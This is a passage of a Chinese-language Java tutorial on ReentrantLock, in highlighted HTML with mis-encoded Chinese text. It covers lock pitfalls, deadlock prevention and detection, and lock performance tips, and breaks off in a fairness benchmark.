<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BlockingQueue</span>&lt;E&gt;, java.io.Serializable {
    
    <span class="hljs-keyword">final</span> Object[] items;
    <span class="hljs-type">int</span> takeIndex;
    <span class="hljs-type">int</span> putIndex;
    <span class="hljs-type">int</span> count;
    
    <span class="hljs-keyword">final</span> ReentrantLock lock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notEmpty;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notFull;
    
    <span class="hljs-comment">// å®ç°ä¸æˆ‘ä»¬çš„å‡ ä¹ç›¸åŒ...</span>
}
</code></pre>
<h2 data-id="heading-141">ç¬¬äº”ç« ï¼šReentrantLock å®è·µ</h2>
<h3 data-id="heading-142">1. å¸¸è§é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-143">1.1 é™·é˜±ä¸€ï¼šå¿˜è®°é‡Šæ”¾é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šæ²¡æœ‰åœ¨finallyä¸­é‡Šæ”¾é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerous</span><span class="hljs-params">()</span> {
    lock.lock();
    doSomething();  <span class="hljs-comment">// å¦‚æœè¿™é‡ŒæŠ›å¼‚å¸¸ï¼Œé”æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼</span>
    lock.unlock();
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šä½¿ç”¨try-finally
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safe</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-144">1.2 é™·é˜±äºŒï¼šlock()æ”¾åœ¨tryå—å†…</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šlock()åœ¨tryå†…éƒ¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongPosition</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        lock.lock();  <span class="hljs-comment">// å¦‚æœlock()ä¹‹å‰å°±æŠ›å¼‚å¸¸ï¼Œfinallyä¼šè°ƒç”¨unlock()</span>
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºIllegalMonitorStateException</span>
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šlock()åœ¨tryä¹‹å‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">correctPosition</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// lock()åœ¨tryä¹‹å‰</span>
    <span class="hljs-keyword">try</span> {
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-145">1.3 é™·é˜±ä¸‰ï¼šé‡å…¥æ¬¡æ•°ä¸åŒ¹é…</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šlockå’Œunlockæ¬¡æ•°ä¸åŒ¹é…
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mismatch</span><span class="hljs-params">()</span> {
    lock.lock();
    lock.lock();  <span class="hljs-comment">// é‡å…¥ï¼Œstate = 2</span>
    <span class="hljs-keyword">try</span> {
        doSomething();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// åªé‡Šæ”¾ä¸€æ¬¡ï¼Œstate = 1ï¼Œé”æœªå®Œå…¨é‡Šæ”¾ï¼</span>
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šæ¯æ¬¡lockéƒ½å¯¹åº”ä¸€æ¬¡unlock
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">match</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            doSomething();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-146">1.4 é™·é˜±å››ï¼šCondition.await()ç”¨ifè€Œéwhile</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šä½¿ç”¨ifæ£€æŸ¥æ¡ä»¶
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongAwait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (!ready) {  <span class="hljs-comment">// å¯èƒ½è™šå‡å”¤é†’</span>
            condition.await();
        }
        <span class="hljs-comment">// readyå¯èƒ½ä»ä¸ºfalseï¼</span>
        process();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šä½¿ç”¨whileå¾ªç¯
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">correctAwait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (!ready) {  <span class="hljs-comment">// å¾ªç¯æ£€æŸ¥</span>
            condition.await();
        }
        <span class="hljs-comment">// readyä¸€å®šä¸ºtrue</span>
        process();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<p><strong>è™šå‡å”¤é†’ï¼ˆSpurious Wakeupï¼‰</strong>ï¼šçº¿ç¨‹å¯èƒ½åœ¨æ²¡æœ‰è¢«signal()çš„æƒ…å†µä¸‹é†’æ¥ï¼Œå¿…é¡»ç”¨whileå¾ªç¯é‡æ–°æ£€æŸ¥æ¡ä»¶ã€‚</p>
<h4 data-id="heading-147">1.5 é™·é˜±äº”ï¼šåœ¨é”™è¯¯çš„çº¿ç¨‹è°ƒç”¨signal</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šä¸æŒæœ‰é”æ—¶è°ƒç”¨signal
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongSignal</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æ²¡æœ‰è·å–é”</span>
    condition.signal();  <span class="hljs-comment">// æŠ›å‡ºIllegalMonitorStateException</span>
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šå¿…é¡»åœ¨æŒæœ‰é”æ—¶è°ƒç”¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">correctSignal</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        condition.signal();
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-148">1.6 é™·é˜±å…­ï¼štryLockè¿”å›å€¼æœªæ£€æŸ¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”™è¯¯ï¼šå¿½ç•¥tryLockè¿”å›å€¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ignoreTryLock</span><span class="hljs-params">()</span> {
    lock.tryLock();  <span class="hljs-comment">// è¿”å›å€¼è¢«å¿½ç•¥</span>
    <span class="hljs-keyword">try</span> {
        doSomething();  <span class="hljs-comment">// å¯èƒ½æ²¡æœ‰æŒæœ‰é”ï¼</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºIllegalMonitorStateException</span>
    }
}

<span class="hljs-comment">/**
 * æ­£ç¡®ï¼šæ£€æŸ¥è¿”å›å€¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkTryLock</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (lock.tryLock()) {
        <span class="hljs-keyword">try</span> {
            doSomething();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-149">2. æ­»é”é¢„é˜²ä¸æ£€æµ‹</h3>
<h4 data-id="heading-150">2.1 æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cac757236674e0ebd0f15437e99499e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=gD0yJV%2FypZmsJR6tHOw8uqCyNA8%3D" alt="deadlock-conditions.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-151">2.2 æ­»é”ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å…¸å‹æ­»é”åœºæ™¯
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadlockDemo</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockA</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// çº¿ç¨‹1æ‰§è¡Œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        lockA.lock();
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶</span>
            lockB.lock();  <span class="hljs-comment">// ç­‰å¾…lockB</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockB.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockA.unlock();
        }
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2æ‰§è¡Œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        lockB.lock();
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶</span>
            lockA.lock();  <span class="hljs-comment">// ç­‰å¾…lockAï¼Œå½¢æˆæ­»é”ï¼</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockA.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockB.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-152">2.3 æ­»é”é¢„é˜²ç­–ç•¥</h4>
<p>é¿å…æ­»é”æˆ‘é€šå¸¸ä¼šä»â€œä¸‰æ¿æ–§â€å…¥æ‰‹ï¼š<strong>ç»Ÿä¸€åŠ é”é¡ºåºã€åŠæ—¶é‡Šæ”¾é”ã€é…åˆè¶…æ—¶/ä¸­æ–­æœºåˆ¶</strong>ã€‚é¦–å…ˆï¼Œå¤šæŠŠé”åŒæ—¶ä½¿ç”¨æ—¶åº”è¯¥çº¦å®šå…¨å±€çš„åŠ é”é¡ºåºï¼Œæ¯”å¦‚æ€»æ˜¯å…ˆé” A å†é” Bï¼Œæ‰€æœ‰ä»£ç éƒ½éµå®ˆè¿™ä¸ªæ¬¡åºï¼Œä»æ ¹æºä¸Šç ´åæ­»é”çš„â€œå¾ªç¯ç­‰å¾…â€æ¡ä»¶ã€‚å…¶æ¬¡ï¼ŒåŠ¡å¿…ç”¨ <code>try { â€¦ } finally { lock.unlock(); }</code> ä¿è¯é”ä¸€å®šè¢«é‡Šæ”¾ï¼Œé¿å…å¼‚å¸¸å¯¼è‡´é”æ°¸è¿œä¸è§£ã€‚å†è€…ï¼Œåœ¨ä¸€äº›å¤æ‚åœºæ™¯ä¸‹ï¼Œæˆ‘ä¼šä½¿ç”¨ <code>tryLock(long timeout, TimeUnit unit)</code> æˆ– <code>lockInterruptibly()</code>ï¼šæ‹¿ä¸åˆ°é”æ—¶å¯ä»¥è¶…æ—¶é€€å‡ºæˆ–è€…å“åº”ä¸­æ–­ï¼Œä»è€Œâ€œè‡ªæ•‘â€ï¼Œè€Œä¸æ˜¯æ— é™æœŸç­‰å¾…ã€‚æ­¤å¤–ï¼Œçº¿ä¸Šæ’æŸ¥æ—¶å¯ä»¥ç»“åˆ <code>jstack</code> æˆ– <code>ThreadMXBean</code> çš„æ£€æµ‹æ–¹æ³•å»å‘ç°å’Œå®šä½æ½œåœ¨æ­»é”ã€‚</p>
<p><strong>ç­–ç•¥ä¸€ï¼šå›ºå®šåŠ é”é¡ºåº</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŒ‰å›ºå®šé¡ºåºè·å–é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FixedOrder</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockA</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lockB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// æ‰€æœ‰æ–¹æ³•éƒ½æŒ‰A-&gt;Bé¡ºåºè·å–é”</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        lockA.lock();
        <span class="hljs-keyword">try</span> {
            lockB.lock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockB.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockA.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        lockA.lock();  <span class="hljs-comment">// åŒæ ·å…ˆAåB</span>
        <span class="hljs-keyword">try</span> {
            lockB.lock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockB.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockA.unlock();
        }
    }
}
</code></pre>
<p><strong>ç­–ç•¥äºŒï¼šä½¿ç”¨tryLockè¶…æ—¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨tryLocké¿å…æ­»é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">safeTransfer</span><span class="hljs-params">(Account from, Account to, <span class="hljs-type">int</span> amount)</span> {
    <span class="hljs-type">long</span> <span class="hljs-variable">deadline</span> <span class="hljs-operator">=</span> System.nanoTime() + TimeUnit.SECONDS.toNanos(<span class="hljs-number">10</span>);
    
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-keyword">if</span> (from.lock.tryLock()) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">if</span> (to.lock.tryLock()) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-comment">// è½¬è´¦æ“ä½œ</span>
                        from.balance -= amount;
                        to.balance += amount;
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                    } <span class="hljs-keyword">finally</span> {
                        to.lock.unlock();
                    }
                }
            } <span class="hljs-keyword">finally</span> {
                from.lock.unlock();
            }
        }
        
        <span class="hljs-comment">// æ£€æŸ¥è¶…æ—¶</span>
        <span class="hljs-keyword">if</span> (System.nanoTime() &gt;= deadline) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¶…æ—¶å¤±è´¥</span>
        }
        
        <span class="hljs-comment">// çŸ­æš‚ä¼‘çœ åé‡è¯•</span>
        Thread.<span class="hljs-keyword">yield</span>();
    }
}
</code></pre>
<p><strong>ç­–ç•¥ä¸‰ï¼šä½¿ç”¨lockInterruptibly</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯ä¸­æ–­çš„è·å–é”ï¼Œæ”¯æŒå–æ¶ˆ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lockInterruptibly();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ...</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// æ£€æµ‹åˆ°æ­»é”æ—¶ï¼Œå¯ä»¥ä¸­æ–­çº¿ç¨‹æ¥æ‰“ç ´æ­»é”</span>
thread.interrupt();
</code></pre>
<h4 data-id="heading-153">2.4 æ­»é”æ£€æµ‹å·¥å…·</h4>
<p><strong>ä½¿ç”¨jstackæ£€æµ‹æ­»é”</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è·å–çº¿ç¨‹è½¬å‚¨</span>
jstack &lt;pid&gt;
</code></pre>
<p><strong>ç¼–ç¨‹æ–¹å¼æ£€æµ‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨ThreadMXBeanæ£€æµ‹æ­»é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadlockDetector</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ThreadMXBean</span> <span class="hljs-variable">threadMXBean</span> <span class="hljs-operator">=</span> ManagementFactory.getThreadMXBean();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detectDeadlock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span>[] deadlockedThreads = threadMXBean.findDeadlockedThreads();
        
        <span class="hljs-keyword">if</span> (deadlockedThreads != <span class="hljs-literal">null</span>) {
            ThreadInfo[] threadInfos = threadMXBean.getThreadInfo(deadlockedThreads);
            
            System.err.println(<span class="hljs-string">"æ£€æµ‹åˆ°æ­»é”ï¼æ¶‰åŠçš„çº¿ç¨‹ï¼š"</span>);
            <span class="hljs-keyword">for</span> (ThreadInfo info : threadInfos) {
                System.err.println(info.getThreadName() + 
                    <span class="hljs-string">" ç­‰å¾…é”: "</span> + info.getLockName() +
                    <span class="hljs-string">" æŒæœ‰è€…: "</span> + info.getLockOwnerName());
            }
        }
    }
    
    <span class="hljs-comment">// å®šæœŸæ£€æµ‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startMonitor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(<span class="hljs-built_in">this</span>::detectDeadlock, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, TimeUnit.SECONDS);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-154">3. æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<h4 data-id="heading-155">3.1 å‡å°é”ç²’åº¦</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ç²—ç²’åº¦é”ï¼šæ•´ä¸ªæ–¹æ³•åŠ é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoarseGrained</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">(String key)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> cache.get(key);
            <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">null</span>) {
                data = loadFromDB(key);  <span class="hljs-comment">// è€—æ—¶IOæ“ä½œä¹Ÿè¢«é”ä½</span>
                cache.put(key, data);
            }
            <span class="hljs-keyword">return</span> data;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}

<span class="hljs-comment">/**
 * ç»†ç²’åº¦é”ï¼šåªé”å¿…è¦éƒ¨åˆ†
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FineGrained</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-comment">// å…ˆæ£€æŸ¥ç¼“å­˜ï¼ˆéœ€è¦é”ï¼‰</span>
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> cache.get(key);
            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> data;
            }
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
        
        <span class="hljs-comment">// ç¼“å­˜æœªå‘½ä¸­ï¼ŒåŠ è½½æ•°æ®ï¼ˆä¸éœ€è¦é”ï¼‰</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> loadFromDB(key);
        
        <span class="hljs-comment">// æ›´æ–°ç¼“å­˜ï¼ˆéœ€è¦é”ï¼‰</span>
        lock.lock();
        <span class="hljs-keyword">try</span> {
            cache.putIfAbsent(key, data);
            <span class="hljs-keyword">return</span> cache.get(key);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-156">3.2 å‡å°‘é”æŒæœ‰æ—¶é—´</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é•¿æ—¶é—´æŒæœ‰é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">longHold</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        prepareData();     <span class="hljs-comment">// å‡†å¤‡æ•°æ®ï¼ˆä¸éœ€è¦é”ï¼‰</span>
        processData();     <span class="hljs-comment">// å¤„ç†æ•°æ®ï¼ˆéœ€è¦é”ï¼‰</span>
        saveResult();      <span class="hljs-comment">// ä¿å­˜ç»“æœï¼ˆä¸éœ€è¦é”ï¼‰</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">/**
 * åªåœ¨å¿…è¦æ—¶æŒæœ‰é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shortHold</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> prepareData();  <span class="hljs-comment">// å‡†å¤‡æ•°æ®ï¼ˆé”å¤–ï¼‰</span>
    
    lock.lock();
    <span class="hljs-keyword">try</span> {
        processData(data);  <span class="hljs-comment">// å¤„ç†æ•°æ®ï¼ˆé”å†…ï¼‰</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
    
    saveResult();  <span class="hljs-comment">// ä¿å­˜ç»“æœï¼ˆé”å¤–ï¼‰</span>
}
</code></pre>
<h4 data-id="heading-157">3.3 ä½¿ç”¨è¯»å†™é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è¯»å¤šå†™å°‘åœºæ™¯ä½¿ç”¨ReadWriteLock
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadWriteOptimization</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantReadWriteLock.<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantReadWriteLock.<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();
    
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-comment">// è¯»æ“ä½œï¼šå¤šçº¿ç¨‹å¯å¹¶å‘</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">read</span><span class="hljs-params">(String key)</span> {
        readLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> data.get(key);
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-comment">// å†™æ“ä½œï¼šç‹¬å </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(String key, Object value)</span> {
        writeLock.lock();
        <span class="hljs-keyword">try</span> {
            data.put(key, value);
        } <span class="hljs-keyword">finally</span> {
            writeLock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-158">3.4 é¿å…é”ç«äº‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨ThreadLocalé¿å…é”ç«äº‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalOptimization</span> {
    
    <span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„SimpleDateFormatï¼Œæ— éœ€åŒæ­¥</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;SimpleDateFormat&gt; dateFormat = 
        ThreadLocal.withInitial(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd"</span>));
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">format</span><span class="hljs-params">(Date date)</span> {
        <span class="hljs-keyword">return</span> dateFormat.get().format(date);  <span class="hljs-comment">// æ— é”</span>
    }
}
</code></pre>
<h4 data-id="heading-159">3.5 å…¬å¹³é”vséå…¬å¹³é”é€‰æ‹©</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ€§èƒ½å¯¹æ¯”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairnessPerformance</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">iterations</span> <span class="hljs-operator">=</span> <span class="hljs-number">100000</span>;
        
        <span class="hljs-comment">// éå…¬å¹³é”æµ‹è¯•</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">unfairTime</span> <span class="hljs-operator">=</span> testLock(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>), threadCount, iterations);
